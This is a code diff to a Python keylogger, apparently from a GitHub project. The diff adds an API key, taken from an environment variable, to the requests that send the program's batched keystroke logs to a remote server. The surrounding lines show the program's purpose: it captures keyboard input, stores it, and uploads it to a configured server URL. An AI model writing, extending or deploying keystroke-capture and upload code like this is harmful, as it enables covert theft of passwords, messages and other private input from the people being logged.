@@ -32,7 +32,7 @@ GitHub: https://github.com/Stalin-143
 class KeyLogger:
     """Keylogger class to handle keyboard input capture and logging."""
 
-    def __init__(self, log_file_path, server_url, batch_size=10, verify_ssl=True):
+    def __init__(self, log_file_path, server_url, batch_size=10, verify_ssl=True, api_key=None):
         """
         Initialize the KeyLogger.
 
@@ -41,11 +41,13 @@ class KeyLogger:
             server_url (str): URL of the server to send logs to
             batch_size (int): Number of keystrokes before sending to server
             verify_ssl (bool): Whether to verify SSL certificates (default: True)
+            api_key (str): API key for authenticating log ingestion
         """
         self.log_file_path = log_file_path
         self.server_url = server_url
         self.batch_size = batch_size
         self.verify_ssl = verify_ssl
+        self.api_key = api_key
         self.buffer = []
 
         # Ensure the log directory exists
@@ -72,9 +74,14 @@ class KeyLogger:
 
         try:
             log_data = ''.join(self.buffer)
+            headers = {}
+            if self.api_key:
+                headers["X-API-Key"] = self.api_key
+
             response = requests.post(
                 self.server_url,
                 data={"log": log_data},
+                headers=headers,
                 timeout=10,
                 verify=self.verify_ssl  # Verify SSL certificates by default
             )
@@ -213,10 +220,15 @@ def main():
     server_url = args.server_url or keylogger_config.get('server_url', '')
     batch_size = args.batch_size or keylogger_config.get('batch_size', 10)
     verify_ssl = not args.no_verify_ssl  # Default to True unless --no-verify-ssl is passed
+    api_key = os.getenv('LOG_INGEST_API_KEY')
 
     if not server_url:
         print("Error: Server URL not configured.")
         print("Please set server_url in config/config.json or use --server-url argument.")
+        sys.exit(1)
+
+    if not api_key or len(api_key) < 24:
+        print("Error: LOG_INGEST_API_KEY environment variable is required and must be at least 24 characters.")
         sys.exit(1)
     
     if args.no_verify_ssl:
@@ -224,7 +236,7 @@ def main():
         print("   This is NOT recommended for production use.")
 
     # Create and start the keylogger
-    keylogger = KeyLogger(log_file_path, server_url, batch_size, verify_ssl)
+    keylogger = KeyLogger(log_file_path, server_url, batch_size, verify_ssl, api_key)
     keylogger.start()
 
 
